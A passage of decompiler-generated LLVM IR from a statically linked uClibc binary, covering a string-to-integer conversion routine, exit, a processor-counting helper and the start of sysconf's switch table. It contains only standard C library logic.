  %v0_804aeac14 = phi i32 [ %v1_804ae74, %dec_label_pc_804ae74 ], [ %v0_804ae74, %dec_label_pc_804ae6c ], [ %v1_804ae85, %dec_label_pc_804ae83 ]
  %v0_804af0523 = phi i32 [ %v1_804ae74, %dec_label_pc_804ae74 ], [ %v4_804ae2f, %dec_label_pc_804ae6c ], [ %v1_804ae74, %dec_label_pc_804ae83 ]
  %v0_804ae86 = phi i32 [ %v1_804ae75, %dec_label_pc_804ae74 ], [ %v1_804ae6c, %dec_label_pc_804ae6c ], [ %v2_804ae83, %dec_label_pc_804ae83 ]
  %v7_804ae89 = icmp sgt i32 %v0_804ae86, 16
  br i1 %v7_804ae89, label %dec_label_pc_804ae90.thread, label %dec_label_pc_804ae90

dec_label_pc_804ae90.thread:                      ; preds = %dec_label_pc_804ae86
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ae9a

dec_label_pc_804ae90:                             ; preds = %dec_label_pc_804ae86, %dec_label_pc_804ae62
  %v0_804af0524 = phi i32 [ %v0_804af0523, %dec_label_pc_804ae86 ], [ %v4_804ae2f, %dec_label_pc_804ae62 ]
  %v0_804aeac15 = phi i32 [ %v0_804aeac14, %dec_label_pc_804ae86 ], [ %v0_804ae74, %dec_label_pc_804ae62 ]
  %v0_804ae9f = phi i32 [ %v0_804ae86, %dec_label_pc_804ae86 ], [ %arg3, %dec_label_pc_804ae62 ]
  %v1_804ae90 = add i32 %v0_804ae9f, -2
  store i32 %v1_804ae90, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  %v6_804ae98 = icmp ugt i32 %v1_804ae90, 34
  br i1 %v6_804ae98, label %dec_label_pc_804aefa, label %dec_label_pc_804ae9a

dec_label_pc_804ae9a:                             ; preds = %dec_label_pc_804ae90.thread, %dec_label_pc_804ae90
  %v0_804ae9f47 = phi i32 [ 16, %dec_label_pc_804ae90.thread ], [ %v0_804ae9f, %dec_label_pc_804ae90 ]
  %v0_804aeac1546 = phi i32 [ %v0_804aeac14, %dec_label_pc_804ae90.thread ], [ %v0_804aeac15, %dec_label_pc_804ae90 ]
  %v0_804af052445 = phi i32 [ %v0_804af0523, %dec_label_pc_804ae90.thread ], [ %v0_804af0524, %dec_label_pc_804ae90 ]
  %div = udiv i32 -1, %v0_804ae9f47
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp41 = urem i32 -1, %v0_804ae9f47
  store i32 %div, i32* %stack_var_-24, align 4
  %v1_804aea4 = trunc i32 %tmp41 to i8
  %v4_804aed7 = urem i32 %arg4, 256
  %sext = mul i32 %tmp41, 16777216
  %v1_804aedd = sdiv i32 %sext, 16777216
  br label %dec_label_pc_804aeac

dec_label_pc_804aeaa:                             ; preds = %dec_label_pc_804aeed, %dec_label_pc_804aed7
  %v4_804aeac.pre = phi i32 [ %v4_804aeac.pre.pre, %dec_label_pc_804aed7 ], [ %v4_804aef2, %dec_label_pc_804aeed ]
  %v0_804aeaa = phi i32 [ %v0_804aeaa.pre, %dec_label_pc_804aed7 ], [ %v1_804aec9, %dec_label_pc_804aeed ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804aed7 ], [ %v2_804aef5, %dec_label_pc_804aeed ]
  store i32 %storemerge4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae9a, %dec_label_pc_804aeaa
  %v0_804af0522 = phi i32 [ %v0_804af052445, %dec_label_pc_804ae9a ], [ %v0_804aeaa, %dec_label_pc_804aeaa ]
  %v0_804aec9 = phi i32 [ %v0_804aeac1546, %dec_label_pc_804ae9a ], [ %v0_804aeaa, %dec_label_pc_804aeaa ]
  %v0_804aef0 = phi i32 [ 0, %dec_label_pc_804ae9a ], [ %storemerge4, %dec_label_pc_804aeaa ]
  %v4_804aeac = phi i32 [ %div, %dec_label_pc_804ae9a ], [ %v4_804aeac.pre, %dec_label_pc_804aeaa ]
  %v1_804aeac = inttoptr i32 %v0_804aec9 to i8*
  %v2_804aeac = load i8, i8* %v1_804aeac, align 1
  %v3_804aeac = zext i8 %v2_804aeac to i32
  %v5_804aeac = and i32 %v4_804aeac, -256
  %v6_804aeac = or i32 %v3_804aeac, %v5_804aeac
  store i32 %v6_804aeac, i32* %eax.global-to-local, align 4
  %v1_804aeae = add i32 %v6_804aeac, -48
  %v1_804aeb1 = trunc i32 %v1_804aeae to i8
  %tmp65 = icmp ult i8 %v1_804aeb1, 10
  br i1 %tmp65, label %dec_label_pc_804aec2, label %dec_label_pc_804aeb6

dec_label_pc_804aeb6:                             ; preds = %dec_label_pc_804aeac
  %v1_804aeb6 = or i32 %v6_804aeac, 32
  %v3_804aeb6 = trunc i32 %v1_804aeb6 to i8
  store i32 %v1_804aeb6, i32* %eax.global-to-local, align 4
  %v1_804aeb9 = and i32 %v1_804aeae, -256
  %v2_804aeb9 = or i32 %v1_804aeb9, 40
  %tmp66 = icmp ult i8 %v3_804aeb6, 97
  br i1 %tmp66, label %dec_label_pc_804aec2, label %dec_label_pc_804aebf

dec_label_pc_804aebf:                             ; preds = %dec_label_pc_804aeb6
  %v1_804aebf = add i32 %v1_804aeb6, -87
  br label %dec_label_pc_804aec2

dec_label_pc_804aec2:                             ; preds = %dec_label_pc_804aeb6, %dec_label_pc_804aeac, %dec_label_pc_804aebf
  %v0_804aeed = phi i32 [ %v2_804aeb9, %dec_label_pc_804aeb6 ], [ %v1_804aeae, %dec_label_pc_804aeac ], [ %v1_804aebf, %dec_label_pc_804aebf ]
  %v1_804aec2 = urem i32 %v0_804aeed, 256
  store i32 %v1_804aec2, i32* %eax.global-to-local, align 4
  %v1_804aec5 = load i32, i32* %esi.global-to-local, align 4
  %v2_804aec5 = sub i32 %v1_804aec2, %v1_804aec5
  %v10_804aec5 = and i32 %v2_804aec5, %v1_804aec5
  %v11_804aec5 = icmp slt i32 %v10_804aec5, 0
  %v13_804aec5 = icmp slt i32 %v2_804aec5, 0
  %v2_804aec7 = icmp eq i1 %v13_804aec5, %v11_804aec5
  br i1 %v2_804aec7, label %dec_label_pc_804aefa, label %dec_label_pc_804aec9

dec_label_pc_804aec9:                             ; preds = %dec_label_pc_804aec2
  %v1_804aec9 = add i32 %v0_804aec9, 1
  store i32 %v1_804aec9, i32* %ebx.global-to-local, align 4
  %v3_804aeca = load i32, i32* %stack_var_-24, align 4
  %tmp67 = icmp ugt i32 %v0_804aef0, %v3_804aeca
  br i1 %tmp67, label %dec_label_pc_804aed7, label %dec_label_pc_804aecf

dec_label_pc_804aecf:                             ; preds = %dec_label_pc_804aec9
  %v14_804aeca = icmp eq i32 %v0_804aef0, %v3_804aeca
  %v1_804aecf = icmp eq i1 %v14_804aeca, false
  br i1 %v1_804aecf, label %dec_label_pc_804aeed, label %dec_label_pc_804aed1

dec_label_pc_804aed1:                             ; preds = %dec_label_pc_804aecf
  %v1_804aed1 = trunc i32 %v0_804aeed to i8
  %tmp68 = icmp ugt i8 %v1_804aed1, %v1_804aea4
  br i1 %tmp68, label %dec_label_pc_804aed7, label %dec_label_pc_804aeed

dec_label_pc_804aed7:                             ; preds = %dec_label_pc_804aed1, %dec_label_pc_804aec9
  store i32 %v4_804aed7, i32* %eax.global-to-local, align 4
  %v0_804aedb = load i32, i32* %ebp.global-to-local, align 4
  %v2_804aedb = and i32 %v0_804aedb, %v4_804aed7
  store i32 %v2_804aedb, i32* %ebp.global-to-local, align 4
  %v2_804aedd = call i32 @__GI___errno_location(i32 %v1_804aedd)
  store i32 %v2_804aedd, i32* %eax.global-to-local, align 4
  %v1_804aee2 = inttoptr i32 %v2_804aedd to i32*
  store i32 34, i32* %v1_804aee2, align 4
  %v0_804aeaa.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804aeac.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aeaa

dec_label_pc_804aeed:                             ; preds = %dec_label_pc_804aed1, %dec_label_pc_804aecf
  %v4_804aef2 = mul i32 %v1_804aec5, %v0_804aef0
  store i32 %v4_804aef2, i32* %eax.global-to-local, align 4
  %v2_804aef5 = add i32 %v4_804aef2, %v1_804aec2
  br label %dec_label_pc_804aeaa

dec_label_pc_804aefa:                             ; preds = %dec_label_pc_804aec2, %dec_label_pc_804ae90
  %v0_804af05 = phi i32 [ %v0_804af0524, %dec_label_pc_804ae90 ], [ %v0_804af0522, %dec_label_pc_804aec2 ]
  %stack_var_-17.0 = phi i8 [ %tmp30, %dec_label_pc_804ae90 ], [ %v1_804aea4, %dec_label_pc_804aec2 ]
  %v4_804aefa = icmp eq i32 %arg2, 0
  br i1 %v4_804aefa, label %dec_label_pc_804af07, label %dec_label_pc_804af01

dec_label_pc_804af01:                             ; preds = %dec_label_pc_804aefa
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804af05 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804af05, i32* %v2_804af05, align 4
  br label %dec_label_pc_804af07

dec_label_pc_804af07:                             ; preds = %dec_label_pc_804aefa, %dec_label_pc_804af01
  %v0_804af07 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804af07, i32* %eax.global-to-local, align 4
  %v1_804af09 = trunc i32 %v0_804af07 to i8
  %v6_804af09 = icmp eq i8 %v1_804af09, 0
  %v2_804af0b = zext i1 %v6_804af09 to i32
  %v1_804af0d5 = or i32 %v2_804af0b, -2147483648
  store i32 %v1_804af0d5, i32* %ebx.global-to-local, align 4
  %v5_804af13 = icmp eq i8 %tmp40, 0
  %v0_804af33.pre.pre = load i32, i32* %edi.global-to-local, align 4
  br i1 %v5_804af13, label %dec_label_pc_804af2b, label %dec_label_pc_804af1a

dec_label_pc_804af1a:                             ; preds = %dec_label_pc_804af07
  %tmp69 = icmp ugt i32 %v0_804af33.pre.pre, %v1_804af0d5
  br i1 %tmp69, label %dec_label_pc_804af1e, label %dec_label_pc_804af2b

dec_label_pc_804af1e:                             ; preds = %dec_label_pc_804af1a
  %v1_804af1e = sext i8 %stack_var_-17.0 to i32
  %v2_804af1e = call i32 @__GI___errno_location(i32 %v1_804af1e)
  store i32 %v2_804af1e, i32* %eax.global-to-local, align 4
  %v1_804af23 = inttoptr i32 %v2_804af1e to i32*
  store i32 34, i32* %v1_804af23, align 4
  %v0_804af29 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804af29, i32* %edi.global-to-local, align 4
  %v0_804af2b.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804af2b

dec_label_pc_804af2b:                             ; preds = %dec_label_pc_804af07, %dec_label_pc_804af1a, %dec_label_pc_804af1e
  %v0_804af33.pre = phi i32 [ %v0_804af33.pre.pre, %dec_label_pc_804af1a ], [ %v0_804af29, %dec_label_pc_804af1e ], [ %v0_804af33.pre.pre, %dec_label_pc_804af07 ]
  %v0_804af2b = phi i32 [ %v0_804af07, %dec_label_pc_804af1a ], [ %v0_804af2b.pre, %dec_label_pc_804af1e ], [ %v0_804af07, %dec_label_pc_804af07 ]
  store i32 %v0_804af2b, i32* %eax.global-to-local, align 4
  %v3_804af2d = trunc i32 %v0_804af2b to i8
  %v4_804af2d = icmp eq i8 %v3_804af2d, 0
  br i1 %v4_804af2d, label %dec_label_pc_804af33, label %dec_label_pc_804af31

dec_label_pc_804af31:                             ; preds = %dec_label_pc_804af2b
  %v1_804af31 = sub i32 0, %v0_804af33.pre
  store i32 %v1_804af31, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804af33

dec_label_pc_804af33:                             ; preds = %dec_label_pc_804af2b, %dec_label_pc_804af31
  %v0_804af33 = phi i32 [ %v1_804af31, %dec_label_pc_804af31 ], [ %v0_804af33.pre, %dec_label_pc_804af2b ]
  store i32 %v0_804af33, i32* %eax.global-to-local, align 4
  %v2_804af37 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804af37, i32* @ebx, align 4
  ret i32 %v0_804af33

; uselistorder directives
  uselistorder i32 %v0_804af33, { 1, 0 }
  uselistorder i32 %v0_804af2b, { 1, 0 }
  uselistorder i32 %v0_804af33.pre, { 1, 0 }
  uselistorder i32 %v0_804af33.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v3_804aeca, { 1, 0 }
  uselistorder i32 %v1_804aec9, { 1, 0 }
  uselistorder i32 %v2_804aec5, { 1, 0 }
  uselistorder i32 %v1_804aec2, { 2, 1, 0 }
  uselistorder i32 %v0_804aeed, { 1, 0 }
  uselistorder i32 %v0_804aef0, { 0, 2, 1 }
  uselistorder i32 %v0_804aeaa, { 1, 0 }
  uselistorder i32 %v4_804aed7, { 1, 0 }
  uselistorder i32 %v0_804ae9f47, { 1, 0 }
  uselistorder i32 %v0_804af0524, { 1, 0 }
  uselistorder i32 %v2_804ae83, { 1, 0 }
  uselistorder i32 %v1_804ae7a, { 1, 0 }
  uselistorder i32 %v1_804ae75, { 1, 0, 2 }
  uselistorder i32 %v0_804ae74, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804ae3c.lcssa, { 1, 0 }
  uselistorder i32 %v0_804ae3b.lcssa, { 1, 0 }
  uselistorder i32 %v3_804ae3c, { 1, 0 }
  uselistorder i32 %v1_804ae3b, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804ae41.pre, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v4_804ae2f, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 3, 5, 4, 0, 6, 1 }
  uselistorder i32* %ebx.global-to-local, { 7, 8, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 11, 12, 13, 14, 15, 16, 3, 4, 1, 2, 5, 6, 7, 8, 17, 9, 10, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804af33, { 1, 0 }
  uselistorder label %dec_label_pc_804af2b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804af07, { 1, 0 }
  uselistorder label %dec_label_pc_804aec2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804aeac, { 1, 0 }
  uselistorder label %dec_label_pc_804ae9a, { 1, 0 }
  uselistorder label %dec_label_pc_804ae86, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ae62, { 1, 0 }
  uselistorder label %dec_label_pc_804ae61, { 1, 0 }
  uselistorder label %dec_label_pc_804ae3b, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v12_804af3e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %v12_804af3e, i32* @ebx, align 4
  %v4_804af54 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 ptrtoint (i32* @global_var_8053420.64 to i32))
  %v1_804af5e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053420.64 to i32))
  %v0_804af63 = load i32, i32* @global_var_80537a8.65, align 8
  %v1_804af6b = icmp eq i32 %v0_804af63, 0
  br i1 %v1_804af6b, label %dec_label_pc_804af73, label %dec_label_pc_804af6f

dec_label_pc_804af6f:                             ; preds = %entry
  %v0_804af6f = load i32, i32* @esi, align 4
  %v1_804af70 = call i32 @unknown_0(i32 %v0_804af6f)
  br label %dec_label_pc_804af73

dec_label_pc_804af73:                             ; preds = %entry, %dec_label_pc_804af6f
  %v3_804af76 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_804af7b = call i32 @__GI___uClibc_fini()
  store i32 134529006, i32* @eax, align 4
  %v0_804af8b = call i32 @_stdio_term()
  %v0_804af90 = load i32, i32* @esi, align 4
  %v1_804af91 = call i32 @__GI__exit(i32 %v0_804af90)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8053420.64 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_804af73, { 1, 0 }
}

define i32 @nprocessors_onln(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v15_804af9b = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* %stack_var_-16, align 4
  %v2_804afaa = call i32 @__GI_config_open(i32 ptrtoint ([11 x i8]* @global_var_8050e6a.66 to i32))
  store i32 %v2_804afaa, i32* @eax, align 4
  store i32 %v2_804afaa, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8050e6a.66 to i32), i32* @edi, align 4
  %v1_804afb2 = icmp eq i32 %v2_804afaa, 0
  br i1 %v1_804afb2, label %dec_label_pc_804b002, label %dec_label_pc_804afb6

dec_label_pc_804afb6:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  store i32 %v15_804af9b, i32* @edi, align 4
  %v6_804aff421 = inttoptr i32 %v2_804afaa to i32*
  %v7_804aff422 = call i32 @__GI_config_read(i32* %v6_804aff421, i32 %v15_804af9b, i32 258, i32 ptrtoint (i32* @global_var_8050e75.67 to i32))
  store i32 %v7_804aff422, i32* @eax, align 4
  %v1_804affc23 = icmp eq i32 %v7_804aff422, 0
  %v1_804affe24 = icmp eq i1 %v1_804affc23, false
  br i1 %v1_804affe24, label %dec_label_pc_804afbc, label %dec_label_pc_804b048

dec_label_pc_804afbc:                             ; preds = %dec_label_pc_804afb6, %dec_label_pc_804afe8.backedge
  %v2_804afbc = load i32, i32* %stack_var_-16, align 4
  %v1_804afbf = inttoptr i32 %v2_804afbc to i32*
  %v2_804afbf = load i32, i32* %v1_804afbf, align 4
  %v1_804afc1 = inttoptr i32 %v2_804afbf to i8*
  %v2_804afc1 = load i8, i8* %v1_804afc1, align 1
  %v11_804afc1 = icmp eq i8 %v2_804afc1, 99
  %v1_804afc4 = icmp eq i1 %v11_804afc1, false
  br i1 %v1_804afc4, label %dec_label_pc_804afe8.backedge, label %dec_label_pc_804afc6

dec_label_pc_804afc6:                             ; preds = %dec_label_pc_804afbc
  %v1_804afc6 = add i32 %v2_804afbf, 1
  %v2_804afc6 = inttoptr i32 %v1_804afc6 to i8*
  %v3_804afc6 = load i8, i8* %v2_804afc6, align 1
  %v9_804afc6 = icmp eq i8 %v3_804afc6, 112
  %v1_804afca = icmp eq i1 %v9_804afc6, false
  br i1 %v1_804afca, label %dec_label_pc_804afe8.backedge, label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804afc6
  %v1_804afcc = add i32 %v2_804afbf, 2
  %v2_804afcc = inttoptr i32 %v1_804afcc to i8*
  %v3_804afcc = load i8, i8* %v2_804afcc, align 1
  %v12_804afcc = icmp eq i8 %v3_804afcc, 117
  %v1_804afd0 = icmp eq i1 %v12_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804afe8.backedge, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v1_804afd2 = add i32 %v2_804afbf, 3
  %v2_804afd2 = inttoptr i32 %v1_804afd2 to i8*
  %v3_804afd2 = load i8, i8* %v2_804afd2, align 1
  %v4_804afd2 = zext i8 %v3_804afd2 to i32
  %v0_804afd6 = load i32, i32* @global_var_8053338, align 8
  %v2_804afdb = mul nuw nsw i32 %v4_804afd2, 2
  %v3_804afdb = add i32 %v2_804afdb, %v0_804afd6
  %v4_804afdb = inttoptr i32 %v3_804afdb to i16*
  %v5_804afdb = load i16, i16* %v4_804afdb, align 2
  %v1_804afdf = and i16 %v5_804afdb, 8
  %v2_804afdf = icmp eq i16 %v1_804afdf, 0
  %v0_804afe5 = load i32, i32* @ebx, align 4
  %v2_804afe5 = zext i1 %v2_804afdf to i32
  %v3_804afe5 = add i32 %v0_804afe5, 1
  %v4_804afe5 = add i32 %v3_804afe5, %v2_804afe5
  store i32 %v4_804afe5, i32* @ebx, align 4
  br label %dec_label_pc_804afe8.backedge

dec_label_pc_804afe8.backedge:                    ; preds = %dec_label_pc_804afd2, %dec_label_pc_804afbc, %dec_label_pc_804afc6, %dec_label_pc_804afcc
  %v0_804aff3.pre = load i32, i32* @esi, align 4
  %v6_804aff4 = inttoptr i32 %v0_804aff3.pre to i32*
  %v7_804aff4 = call i32 @__GI_config_read(i32* %v6_804aff4, i32 %v15_804af9b, i32 258, i32 ptrtoint (i32* @global_var_8050e75.67 to i32))
  store i32 %v7_804aff4, i32* @eax, align 4
  %v1_804affc = icmp eq i32 %v7_804aff4, 0
  %v1_804affe = icmp eq i1 %v1_804affc, false
  br i1 %v1_804affe, label %dec_label_pc_804afbc, label %dec_label_pc_804b048

dec_label_pc_804b002:                             ; preds = %entry
  %v2_804b007 = call i32 @__GI_config_open(i32 ptrtoint ([14 x i8]* @global_var_8050e77.68 to i32))
  store i32 %v2_804b007, i32* @eax, align 4
  store i32 %v2_804b007, i32* @esi, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v15_804af9b, i32* @edi, align 4
  %v1_804b013 = icmp eq i32 %v2_804b007, 0
  %v1_804b015 = icmp eq i1 %v1_804b013, false
  br i1 %v1_804b015, label %dec_label_pc_804b030.preheader, label %dec_label_pc_804b048

dec_label_pc_804b030.preheader:                   ; preds = %dec_label_pc_804b002
  %v6_804b03c17 = inttoptr i32 %v2_804b007 to i32*
  %v7_804b03c18 = call i32 @__GI_config_read(i32* %v6_804b03c17, i32 %v15_804af9b, i32 459266, i32 ptrtoint (i32* @global_var_8050ea7.70 to i32))
  store i32 %v7_804b03c18, i32* @eax, align 4
  %v1_804b04419 = icmp eq i32 %v7_804b03c18, 0
  %v1_804b04620 = icmp eq i1 %v1_804b04419, false
  br i1 %v1_804b04620, label %dec_label_pc_804b019, label %dec_label_pc_804b048

dec_label_pc_804b019:                             ; preds = %dec_label_pc_804b030.preheader, %dec_label_pc_804b019
  %v2_804b019 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b019, i32* @eax, align 4
  %v1_804b01c = inttoptr i32 %v2_804b019 to i32*
  %v2_804b01c = load i32, i32* %v1_804b01c, align 4
  %v5_804b023 = call i32 @__GI_strcoll(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e85.69, i32 0, i32 0), i32 %v2_804b01c)
  %v5_804b02a = icmp eq i32 %v5_804b023, 0
  %v0_804b02d = load i32, i32* @ebx, align 4
  %v2_804b02d = zext i1 %v5_804b02a to i32
  %v3_804b02d = add i32 %v0_804b02d, %v2_804b02d
  store i32 %v3_804b02d, i32* @ebx, align 4
  %v0_804b03b.pre = load i32, i32* @esi, align 4
  %v6_804b03c = inttoptr i32 %v0_804b03b.pre to i32*
  %v7_804b03c = call i32 @__GI_config_read(i32* %v6_804b03c, i32 %v15_804af9b, i32 459266, i32 ptrtoint (i32* @global_var_8050ea7.70 to i32))
  store i32 %v7_804b03c, i32* @eax, align 4
  %v1_804b044 = icmp eq i32 %v7_804b03c, 0
  %v1_804b046 = icmp eq i1 %v1_804b044, false
  br i1 %v1_804b046, label %dec_label_pc_804b019, label %dec_label_pc_804b048

dec_label_pc_804b048:                             ; preds = %dec_label_pc_804afb6, %dec_label_pc_804afe8.backedge, %dec_label_pc_804b030.preheader, %dec_label_pc_804b019, %dec_label_pc_804b002
  %v0_804b048 = load i32, i32* @esi, align 4
  %tmp15 = inttoptr i32 %v0_804b048 to i32*
  %v3_804b049 = call i32 @__GI_config_close(i32* %tmp15)
  %v0_804b04f = load i32, i32* @ebx, align 4
  %v1_804b04f = icmp eq i32 %v0_804b04f, 0
  %v1_804b051 = icmp eq i1 %v1_804b04f, false
  br i1 %v1_804b051, label %dec_label_pc_804b055, label %dec_label_pc_804b053

dec_label_pc_804b053:                             ; preds = %dec_label_pc_804b048
  %v1_804b053 = and i32 %v0_804b04f, -256
  %v2_804b053 = or i32 %v1_804b053, 1
  br label %dec_label_pc_804b055

dec_label_pc_804b055:                             ; preds = %dec_label_pc_804b048, %dec_label_pc_804b053
  %v0_804b055 = phi i32 [ %v0_804b04f, %dec_label_pc_804b048 ], [ %v2_804b053, %dec_label_pc_804b053 ]
  ret i32 %v0_804b055

; uselistorder directives
  uselistorder i32 %v15_804af9b, { 2, 1, 5, 3, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8050ea7.70 to i32), { 1, 0 }
  uselistorder i32 459266, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8050e75.67 to i32), { 1, 0 }
  uselistorder i32 258, { 1, 0 }
  uselistorder label %dec_label_pc_804b055, { 1, 0 }
  uselistorder label %dec_label_pc_804b048, { 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_804b019, { 1, 0 }
  uselistorder label %dec_label_pc_804afe8.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804afbc, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b05c = load i32, i32* @esi, align 4
  %v0_804b05d = load i32, i32* @ebx, align 4
  store i32 %v0_804b05d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @eax, align 4
  switch i32 %arg1, label %dec_label_pc_804b07a [
    i32 0, label %dec_label_pc_804b1b4
    i32 1, label %dec_label_pc_804b1b4
    i32 2, label %dec_label_pc_804b08a
    i32 3, label %dec_label_pc_804b094
    i32 4, label %dec_label_pc_804b09e
    i32 5, label %dec_label_pc_804b1ad
    i32 6, label %dec_label_pc_804b0a5
    i32 7, label %dec_label_pc_804b070
    i32 8, label %dec_label_pc_804b070
    i32 9, label %dec_label_pc_804b070
    i32 10, label %dec_label_pc_804b070
    i32 11, label %dec_label_pc_804b070
    i32 12, label %dec_label_pc_804b070
    i32 13, label %dec_label_pc_804b070
    i32 14, label %dec_label_pc_804b070
    i32 15, label %dec_label_pc_804b070
    i32 16, label %dec_label_pc_804b070
    i32 17, label %dec_label_pc_804b070
    i32 18, label %dec_label_pc_804b070
    i32 19, label %dec_label_pc_804b070
    i32 20, label %dec_label_pc_804b070
    i32 21, label %dec_label_pc_804b070
    i32 22, label %dec_label_pc_804b070
    i32 23, label %dec_label_pc_804b1b4
    i32 24, label %dec_label_pc_804b1b4
    i32 25, label %dec_label_pc_804b1e3
    i32 26, label %dec_label_pc_804b1dc
    i32 27, label %dec_label_pc_804b1b4
    i32 28, label %dec_label_pc_804b0b6
    i32 29, label %dec_label_pc_804b1b9
    i32 30, label %dec_label_pc_804b0af
    i32 31, label %dec_label_pc_804b1c7
    i32 32, label %dec_label_pc_804b1b4
    i32 33, label %dec_label_pc_804b1b4
    i32 34, label %dec_label_pc_804b1b4
    i32 35, label %dec_label_pc_804b1c0
    i32 36, label %dec_label_pc_804b1ea
    i32 37, label %dec_label_pc_804b1f1
    i32 38, label %dec_label_pc_804b1ea
    i32 39, label %dec_label_pc_804b0c0
    i32 40, label %dec_label_pc_804b1a6
    i32 41, label %dec_label_pc_804b1b4
    i32 42, label %dec_label_pc_804b1c7
    i32 43, label %dec_label_pc_804b1f1
    i32 44, label %dec_label_pc_804b1f8
    i32 45, label %dec_label_pc_804b1f1
    i32 46, label %dec_label_pc_804b1b9
    i32 47, label %dec_label_pc_804b1b9
    i32 48, label %dec_label_pc_804b1b9
    i32 49, label %dec_label_pc_804b1b4
    i32 50, label %dec_label_pc_804b1b4
    i32 51, label %dec_label_pc_804b1b9
    i32 52, label %dec_label_pc_804b1b4
    i32 53, label %dec_label_pc_804b1b4
    i32 54, label %dec_label_pc_804b1b4
    i32 55, label %dec_label_pc_804b1b4
    i32 56, label %dec_label_pc_804b1b4
    i32 57, label %dec_label_pc_804b1b4
    i32 58, label %dec_label_pc_804b1b4
    i32 59, label %dec_label_pc_804b1b4
    i32 60, label %dec_label_pc_804b1b4
    i32 61, label %dec_label_pc_804b1b4
    i32 62, label %dec_label_pc_804b1b4
    i32 63, label %dec_label_pc_804b1b4
    i32 64, label %dec_label_pc_804b1b4
    i32 65, label %dec_label_pc_804b1b4
    i32 66, label %dec_label_pc_804b1b4
    i32 67, label %dec_label_pc_804b070
    i32 68, label %dec_label_pc_804b070
    i32 69, label %dec_label_pc_804b1c0
    i32 70, label %dec_label_pc_804b1c0
    i32 71, label %dec_label_pc_804b1c0
    i32 72, label %dec_label_pc_804b1c7
    i32 73, label %dec_label_pc_804b1ce
    i32 74, label %dec_label_pc_804b1d5
    i32 75, label %dec_label_pc_804b0ca
    i32 76, label %dec_label_pc_804b1d5
    i32 77, label %dec_label_pc_804b070
    i32 78, label %dec_label_pc_804b070
    i32 79, label %dec_label_pc_804b070
    i32 80, label %dec_label_pc_804b070
    i32 81, label %dec_label_pc_804b070
    i32 82, label %dec_label_pc_804b070
    i32 83, label %dec_label_pc_804b0d4
    i32 84, label %dec_label_pc_804b139
    i32 85, label %dec_label_pc_804b1b4
    i32 86, label %dec_label_pc_804b1b4
    i32 87, label %dec_label_pc_804b1dc
    i32 88, label %dec_label_pc_804b140
    i32 89, label %dec_label_pc_804b14a
    i32 90, label %dec_label_pc_804b1ce
    i32 91, label %dec_label_pc_804b070
    i32 92, label %dec_label_pc_804b070
    i32 93, label %dec_label_pc_804b070
    i32 94, label %dec_label_pc_804b070
    i32 95, label %dec_label_pc_804b1b9
    i32 96, label %dec_label_pc_804b1b4
    i32 97, label %dec_label_pc_804b1b4
    i32 98, label %dec_label_pc_804b070
    i32 99, label %dec_label_pc_804b070
    i32 100, label %dec_label_pc_804b070
    i32 101, label %dec_label_pc_804b154
